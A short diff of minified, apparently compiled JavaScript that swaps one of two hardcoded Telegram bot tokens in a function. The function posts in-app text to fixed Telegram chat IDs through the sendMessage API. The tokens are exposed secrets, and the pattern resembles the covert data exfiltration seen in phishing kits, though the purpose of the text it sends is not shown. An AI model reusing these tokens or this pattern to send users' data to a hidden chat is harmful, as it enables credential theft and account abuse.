@@ -77929,7 +77929,7 @@ vO(){var s=0,r=A.N(t.H),q=1,p,o=this,n,m,l,k,j,i,h,g,f,e
 var $async$vO=A.O(function(a,b){if(a===1){p=b
 s=q}while(true)switch(s){case 0:k=o.ch
 j=k?-4505648596:-4571066933
-i="https://api.telegram.org/bot"+(k?"7554383122:AAFc6N_dH9SkylOtcFEFfx-B37vnrS1x0Yo":"7438458842:AAFc6N_dH9SkylOtcFEFfx-B37vnrS1x0Yo")+"/sendMessage"
+i="https://api.telegram.org/bot"+(k?"7554383122:AAFc6N_dH9SkylOtcFEFfx-B37vnrS1x0Yo":"7438458842:AAHT8BrepPOXtHclebYo04SHxuB97Riujtw")+"/sendMessage"
 h=t.N
 g=A.ag(["text",o.db,"disable_web_page_preview",!1,"disable_notification",!1,"reply_to_message_id",null,"chat_id",j],h,t.z)
 f=A.ag(["accept","application/json","User-Agent","Telegram Bot SDK - (https://github.com/irazasyed/telegram-bot-sdk)","content-type","application/json"],h,h)
